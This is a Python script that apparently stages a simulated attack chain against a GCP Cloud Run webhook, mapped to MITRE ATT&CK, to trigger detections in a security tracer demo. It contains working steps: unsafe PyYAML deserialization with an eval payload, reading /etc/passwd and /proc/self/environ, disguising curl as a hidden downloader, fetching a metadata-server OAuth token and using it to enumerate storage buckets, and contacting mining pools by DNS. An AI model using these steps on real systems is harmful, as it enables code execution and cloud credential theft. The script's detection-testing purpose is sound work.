"""Serverless tracer kill chain — GCP Cloud Run order-webhook (MITRE ATT&CK)."""
from __future__ import annotations

import json
import os
import shutil
import socket
import subprocess
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

WORKSHOP_MARKER = Path("/tmp/jss-order-yaml-chain.txt")
RENAMED_DOWNLOADER = Path("/tmp/.wget")
MINER_BINARY = Path("/tmp/xmrig")
EICAR_PATH = Path("/tmp/eicar.com")
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
DEFAULT_YAML_PAYLOAD = "!!python/object/apply:builtins.eval\nargs: ['\"exploited\"']"
GCP_METADATA = "metadata.google.internal"
SENSITIVE_PATHS = ("/etc/passwd", "/etc/hosts", "/proc/self/environ")
MINER_DNS = ("pool.supportxmr.com", "xmr.pool.minergate.com")


def _redact_token(token: str) -> str:
    if not token:
        return ""
    if len(token) <= 12:
        return token[:4] + "..."
    return f"{token[:8]}...{token[-4:]}"


def _run_proc(cmd: list[str], timeout: float = 12, input_text: str | None = None) -> dict[str, Any]:
    try:
        proc = subprocess.run(
            cmd,
            input=input_text,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "command": cmd,
            "returncode": proc.returncode,
            "stdout": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
        }
    except Exception as exc:
        return {"command": cmd, "returncode": None, "error": str(exc)}


def _gcp_http_get(path: str) -> tuple[int, str]:
    url = f"http://{GCP_METADATA}{path}"
    req = Request(url, headers={"Metadata-Flavor": "Google"})
    with urlopen(req, timeout=5) as resp:
        return resp.status, resp.read().decode("utf-8")


def poisoned_manifest(body: dict) -> str | None:
    manifest = body.get("fulfillmentManifest") or body.get("shippingConfigYaml")
    if isinstance(manifest, str) and manifest.strip():
        return manifest
    return None


def exploit_yaml(payload: str) -> dict[str, Any]:
    import yaml

    try:
        result = yaml.load(payload, Loader=yaml.Loader)
        exploited = result == "exploited" or result is not None
        return {"success": True, "exploited": exploited, "result": str(result)}
    except Exception as exc:
        return {"success": False, "exploited": False, "error": str(exc)}


def _renamed_downloader() -> dict[str, Any]:
    curl_path = shutil.which("curl") or "/usr/bin/curl"
    output_path = Path("/tmp/jss-serverless-downloader.out")
    steps = [
        _run_proc(["cp", curl_path, str(RENAMED_DOWNLOADER)]),
        _run_proc(["chmod", "755", str(RENAMED_DOWNLOADER)]),
        _run_proc(
            [
                str(RENAMED_DOWNLOADER),
                "-fsSL",
                "--max-time",
                "8",
                "https://icanhazip.com",
                "-o",
                str(output_path),
            ],
            timeout=12,
        ),
    ]
    return {
        "downloader_path": str(RENAMED_DOWNLOADER),
        "output_path": str(output_path),
        "steps": steps,
        "downloaded": output_path.exists() and output_path.stat().st_size > 0,
    }


def _sensitive_file_cat() -> dict[str, Any]:
    steps = []
    for path in SENSITIVE_PATHS:
        step = _run_proc(["cat", path])
        step["path"] = path
        steps.append(step)
    return {
        "steps": steps,
        "paths_read": sum(1 for s in steps if s.get("returncode") == 0),
    }


def _metadata_theft() -> dict[str, Any]:
    curl_probe = _run_proc(
        [
            "curl",
            "-s",
            "-H",
            "Metadata-Flavor: Google",
            f"http://{GCP_METADATA}/computeMetadata/v1/instance/service-accounts/default/email",
        ]
    )
    sa_email = ""
    token_redacted: dict[str, Any] = {}
    access_token = ""
    try:
        _, sa_email = _gcp_http_get("/computeMetadata/v1/instance/service-accounts/default/email")
        sa_email = sa_email.strip()
    except (HTTPError, URLError, TimeoutError, OSError) as exc:
        sa_email = f"error: {exc}"

    try:
        _, token_raw = _gcp_http_get(
            "/computeMetadata/v1/instance/service-accounts/default/token"
            "?scopes=https://www.googleapis.com/auth/cloud-platform"
        )
        token_payload = json.loads(token_raw)
        access_token = token_payload.get("access_token", "")
        token_redacted = {
            "access_token": _redact_token(access_token),
            "expires_in": token_payload.get("expires_in"),
            "token_type": token_payload.get("token_type"),
        }
    except (HTTPError, URLError, TimeoutError, OSError, json.JSONDecodeError) as exc:
        token_redacted = {"error": str(exc)}

    return {
        "metadata_host": GCP_METADATA,
        "service_account": sa_email,
        "token_redacted": token_redacted,
        "curl_metadata_process": curl_probe,
        "access_token_available": bool(access_token),
        "upwind": ["GCP credentials access", "Metadata server access"],
        "_access_token": access_token,
    }


def _gcs_enumeration(access_token: str) -> dict[str, Any]:
    project = os.getenv("GOOGLE_CLOUD_PROJECT") or os.getenv("GCP_PROJECT") or ""
    buckets: list[str] = []
    error = None
    if access_token and project:
        try:
            url = f"https://storage.googleapis.com/storage/v1/b?project={project}&maxResults=8"
            req = Request(url, headers={"Authorization": f"Bearer {access_token}"})
            with urlopen(req, timeout=8) as resp:
                payload = json.loads(resp.read().decode("utf-8"))
            buckets = [item["name"] for item in payload.get("items", [])]
        except (HTTPError, URLError, TimeoutError, OSError, json.JSONDecodeError, KeyError) as exc:
            error = str(exc)
    elif not project:
        error = "GOOGLE_CLOUD_PROJECT not set"
    else:
        error = "No metadata access token"

    return {
        "project": project,
        "buckets": buckets,
        "error": error,
        "upwind": ["Cloud Audit Logs storage", "data exfiltration"],
    }


def _cryptominer_sim() -> dict[str, Any]:
    dns_results: list[dict[str, Any]] = []
    for domain in MINER_DNS:
        entry: dict[str, Any] = {"domain": domain, "resolved": []}
        try:
            entry["resolved"] = list(
                {ai[4][0] for ai in socket.getaddrinfo(domain, 443, proto=socket.IPPROTO_TCP)}
            )
        except socket.gaierror as exc:
            entry["error"] = str(exc)
        dns_results.append(entry)

    # Detection-friendly: argv0=xmrig via exec -a, plus renamed sleep binary
    steps = [
        _run_proc(["sh", "-c", "--", "exec -a xmrig sleep 3"]),
        _run_proc(["cp", "/bin/sleep", str(MINER_BINARY)]),
        _run_proc(["chmod", "755", str(MINER_BINARY)]),
        _run_proc([str(MINER_BINARY), "2"]),
    ]
    return {
        "miner_path": str(MINER_BINARY),
        "process_steps": steps,
        "dns_probes": dns_results,
        "warning": "Synthetic only — exec -a xmrig + sleep renamed; no real mining",
        "upwind": ["Crypto mining threats", "CryptoMiners Services DNS"],
    }


def _eicar_file_write() -> dict[str, Any]:
    tee_step = _run_proc(["tee", str(EICAR_PATH)], input_text=EICAR + "\n")
    EICAR_PATH.write_text(EICAR, encoding="utf-8")
    cat_step = _run_proc(["cat", str(EICAR_PATH)])
    return {
        "path": str(EICAR_PATH),
        "tee_process": tee_step,
        "cat_process": cat_step,
        "written": EICAR_PATH.exists(),
        "length": len(EICAR) if EICAR_PATH.exists() else 0,
        "upwind": ["Malware protection", "Direct File system access"],
    }


def run_checkout_chain(manifest: str) -> dict[str, Any]:
    chain: list[dict[str, Any]] = []

    chain.append(
        {
            "step": 0,
            "mitre": ["T1190"],
            "tactic": "Initial Access",
            "action": "exploit_public_checkout_api",
            "pattern": "unauthenticated_post_checkout",
            "note": "Tracer API catalog sees POST /checkout with poisoned fulfillmentManifest",
            "upwind": ["API custom rules", "Unauthorized API"],
        }
    )

    yaml_result = exploit_yaml(manifest)
    chain.append(
        {
            "step": 1,
            "mitre": ["T1203"],
            "tactic": "Execution",
            "action": "yaml.load fulfillmentManifest in handle_checkout",
            "cve": "CVE-2020-14343",
            "pattern": "unsafe_deserialization",
            **yaml_result,
            "upwind": ["CVE-2020-14343 / unsafe deserialization"],
        }
    )

    id_file = Path("/tmp/jss-yaml-chain-id.txt")
    id_redirect = _run_proc(["sh", "-c", "--", f"id > {id_file}"])
    id_step = _run_proc(["id", "-a"])
    marker_text = f"yaml-chain:{yaml_result.get('result')}\n{id_step.get('stdout', '')}\n"
    WORKSHOP_MARKER.write_text(marker_text, encoding="utf-8")
    chain.append(
        {
            "step": 2,
            "mitre": ["T1059.004"],
            "tactic": "Execution",
            "action": "post_exploit_identity_probe",
            "processes": {"sh_c_id_redirect": id_redirect, "discrete_id": id_step},
            "marker_file": str(WORKSHOP_MARKER),
            "id_file": str(id_file),
            "upwind": ["Process events", "Operating system utilities processes"],
        }
    )

    shell_pipe = _run_proc(["sh", "-c", "--", f"id 2>&1 | tee -a {WORKSHOP_MARKER}"])
    tee_pipe = _run_proc(["sh", "-c", "--", f"id | tee {WORKSHOP_MARKER}.tee"])
    pip_list = _run_proc(["python3", "-m", "pip", "list", "--format=columns"])
    chain.append(
        {
            "step": 3,
            "mitre": ["T1059.004"],
            "tactic": "Execution",
            "action": "shell_pipe_redirect",
            "processes": {
                "shell_pipe": shell_pipe,
                "tee_via_shell": tee_pipe,
                "pip_list": pip_list,
            },
            "upwind": ["Shell Process Redirect", "Custom Process rules", "Package manager enumeration"],
        }
    )

    renamed = _renamed_downloader()
    chain.append(
        {
            "step": 4,
            "mitre": ["T1027"],
            "tactic": "Defense Evasion",
            "action": "renamed_downloader_execution",
            "pattern": "cp_curl_to_hidden_path",
            **renamed,
            "upwind": ["Operating system utilities processes", "Out Of Baseline"],
        }
    )

    sensitive = _sensitive_file_cat()
    chain.append(
        {
            "step": 5,
            "mitre": ["T1005"],
            "tactic": "Collection",
            "action": "sensitive_system_file_cat",
            "pattern": "discrete_cat_passwd_proc",
            **sensitive,
            "upwind": [
                "Sensitive file access",
                "Sensitive System File Access",
                "Operating system utilities processes",
            ],
        }
    )

    metadata = _metadata_theft()
    access_token = metadata.pop("_access_token", "")
    chain.append(
        {
            "step": 6,
            "mitre": ["T1552.005"],
            "tactic": "Credential Access",
            "action": "gcp_metadata_token_theft",
            "scope": "cloud-run-runtime",
            **metadata,
        }
    )

    chain.append(
        {
            "step": 7,
            "mitre": ["T1087", "T1619"],
            "tactic": "Discovery",
            "action": "gcs_enumeration",
            "scope": "cloud-run-data-plane",
            **_gcs_enumeration(access_token),
        }
    )

    miner = _cryptominer_sim()
    chain.append(
        {
            "step": 8,
            "mitre": ["T1496"],
            "tactic": "Impact",
            "action": "cryptominer_simulation",
            "pattern": "xmrig_sleep_binary_dns_probe",
            **miner,
        }
    )

    eicar = _eicar_file_write()
    chain.append(
        {
            "step": 9,
            "mitre": ["T1565.001"],
            "tactic": "Impact",
            "action": "eicar_file_write",
            "pattern": "malware_test_file_tee",
            **eicar,
        }
    )

    exploited = bool(yaml_result.get("exploited"))
    return {
        "exploited": exploited,
        "pattern": "serverless_tracer_kill_chain",
        "cve": "CVE-2020-14343",
        "scope": "order-webhook-cloud-run",
        "instrumentation": "upwind-tracer",
        "mitre_attack": {
            "tactics": [
                "Initial Access",
                "Execution",
                "Defense Evasion",
                "Collection",
                "Credential Access",
                "Discovery",
                "Impact",
            ],
            "techniques": [
                "T1190",
                "T1203",
                "T1059.004",
                "T1027",
                "T1005",
                "T1552.005",
                "T1087",
                "T1619",
                "T1496",
                "T1565.001",
            ],
        },
        "chain": chain,
        "narrative": (
            "Cloud Run order-webhook tracer story: public checkout (T1190) → PyYAML RCE (T1203) → "
            "shell/id toolkit (T1059) → renamed curl downloader (T1027) → sensitive cat (T1005) → "
            "metadata OAuth token (T1552.005) → GCS discovery (T1619) → miner impact (T1496) → EICAR file (T1565)."
        ),
        "presenter_notes": {
            "tracer_signals": "Process (id, sh, cp, cat, curl, xmrig), File (EICAR, markers), API (POST /checkout), DNS (miner pools)",
            "audit_epilogue": "Correlate GCS ListBuckets in Cloud Audit Logs after step 7",
            "demo_trigger": "POST /api/checkout with fulfillmentManifest",
        },
        "upwind_policies": [
            "API custom rules — poisoned checkout",
            "Shell Process Redirect",
            "GCP credentials access",
            "Crypto mining threats",
            "Malware protection",
            "Cloud Audit Logs storage",
        ],
    }
